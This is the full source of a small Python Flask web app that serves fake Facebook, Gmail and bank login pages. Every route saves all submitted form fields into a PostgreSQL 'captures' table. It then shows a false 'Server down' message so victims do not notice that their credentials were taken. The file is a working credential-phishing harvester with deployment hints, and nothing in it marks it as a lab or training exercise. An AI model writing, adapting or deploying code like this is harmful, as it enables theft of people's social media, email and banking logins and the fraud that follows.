from flask import Flask, render_template, request, redirect, url_for, flash
import psycopg2
import os

app = Flask(__name__)
app.secret_key = "supersecret"  # Needed for flashing messages

# PostgreSQL database URL from Render environment variable
DB_URL = os.environ.get("DATABASE_URL")  # Make sure you set this in Render

# Create table if it doesn't exist
def init_db():
    conn = psycopg2.connect(DB_URL)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS captures (
            id SERIAL PRIMARY KEY,
            site TEXT,
            field_name TEXT,
            field_value TEXT
        )
    """)
    conn.commit()
    conn.close()

def save_data(site, form_data):
    conn = psycopg2.connect(DB_URL)
    c = conn.cursor()
    for field, value in form_data.items():
        c.execute(
            "INSERT INTO captures (site, field_name, field_value) VALUES (%s, %s, %s)",
            (site, field, value)
        )
    conn.commit()
    conn.close()

@app.route('/', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        save_data("Facebook", request.form)
        flash("Server down. Please try again later.", "error")
        return redirect(url_for('facebook'))
    return render_template("facebook.html")

@app.route('/gmail', methods=['GET', 'POST'])
def gmail():
    if request.method == 'POST':
        save_data("Gmail", request.form)
        flash("Server down. Please try again later.", "error")
        return redirect(url_for('gmail'))
    return render_template("gmail.html")

@app.route('/bank', methods=['GET', 'POST'])
def bank():
    if request.method == 'POST':
        save_data("Bank", request.form)
        flash("Server down. Please try again later.", "error")
        return redirect(url_for('bank'))
    return render_template("bank.html")

if __name__ == '__main__':
    init_db()
    app.run(port=5001, debug=True)
